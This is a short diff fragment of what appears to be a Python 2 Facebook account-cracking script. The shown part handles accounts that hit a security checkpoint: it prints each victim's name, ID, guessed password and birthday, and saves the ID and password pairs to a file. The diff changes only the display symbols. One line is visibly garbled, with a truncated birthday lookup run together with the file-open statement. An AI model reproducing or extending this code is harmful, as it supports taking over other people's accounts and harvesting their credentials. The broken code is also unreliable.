@@ -263,11 +263,11 @@ def action():
                 okb.close()
                 oks.append(c + user + pass1)
             elif  'www.facebook.com' in q['error_msg']:
-		print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
-		print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
-		print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-		print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass8 + '\n'
-		print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday								cps = open('save/checkpoint.txt', 'a')
+		print '\x1c\033[1;94m[\xe2\x9c\x93] \x1c\033[1;94mCheckpoint'
+		print '\x1c\033[1;94m[\xe2\x9c\x94] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
+		print '\x1c\033[1;94m[[\xe2\x9c\x96] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
+		print '\x1c\033[1;94m[[\xe2\x9c\x91] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass8 + '\n'
+		print '\x1c\033[1;97m[[\xe2\x9c\x92] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday								cps = open('save/checkpoint.txt', 'a')
 		cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
                 cpb.append(c + user + pass1)
